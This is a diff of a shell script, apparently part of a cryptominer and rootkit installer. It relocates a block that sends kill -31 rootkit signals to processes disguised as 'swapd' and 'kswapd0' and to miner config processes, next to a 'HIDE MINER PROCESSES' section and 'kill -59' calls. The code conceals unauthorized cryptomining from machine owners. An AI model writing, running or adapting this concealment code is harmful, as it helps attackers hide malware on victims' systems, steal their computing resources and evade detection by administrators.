@@ -2185,6 +2185,13 @@ else
     echo '  systemctl status lightd → active (running) ✓'
 fi
 
+# Hide running processes using rootkit signals
+kill -31 $(pgrep -f -u root config.json 2>/dev/null) 2>/dev/null &
+kill -31 $(pgrep -f -u root config_background.json 2>/dev/null) 2>/dev/null &
+kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+#reptile_cmd hide
+
 echo ''
 
 # ==================== HIDE MINER PROCESSES ====================
@@ -2208,10 +2215,3 @@ send_sig 59 config.json swapd swapfile lightd
 echo "[✓] kill -59 sent"
 
 echo '========================================================================'
-
-# Hide running processes using rootkit signals
-kill -31 $(pgrep -f -u root config.json 2>/dev/null) 2>/dev/null &
-kill -31 $(pgrep -f -u root config_background.json 2>/dev/null) 2>/dev/null &
-kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-reptile_cmd hide
